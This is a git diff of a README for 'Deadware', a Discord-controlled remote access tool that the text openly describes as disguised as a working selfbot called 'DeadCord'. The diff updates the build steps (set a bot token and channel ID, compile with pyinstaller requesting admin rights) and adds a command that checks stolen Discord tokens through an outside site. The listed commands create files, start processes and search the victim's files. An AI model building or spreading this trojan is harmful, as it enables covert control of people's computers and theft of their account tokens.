@@ -7,7 +7,7 @@ Special thanks too `mte0` for contributing to the script!
 
 ## How to setup
 1. Create a Discord Bot in the [Discord developer portal](https://discord.com/developers/applications)
-2. In `deadcord.py` replace line `1006` with your Discord Bot Token and in line `819` change it to your channel ID
+2. In `deadcord.py` replace the details at line 17 and 18 (with your channel id, and your bot token)
 3. Compile `deadcord.py` with pyinstaller. I would suggest using the following command in step 4 or you can run the `Builder.py` for speed
 4. `pyinstaller deadcord.py --onefile --uac-admin`
 
@@ -17,6 +17,7 @@ Special thanks too `mte0` for contributing to the script!
 
 As mentioned, Deadware is disguised as a selfbot called `DeadCord` which is a fully functioning selfbot with over 75 commands. However, the real commands are in the Deadware bot. The following list is the up to date commands:
 
+* check <token> - returns state and details of a discord token (using https://utilities.tk)
 * test_con - tests connection
 * create_file <filename> - creates a file
 * start_process <process> - starts process
@@ -36,14 +37,3 @@ As mentioned, Deadware is disguised as a selfbot called `DeadCord` which is a fu
 * ext_search <file extention> - searches for file with extention
 * change_dir <folder> - changes file directory
  
-
- 
- 
-
-
-
- 
-
-
-
-
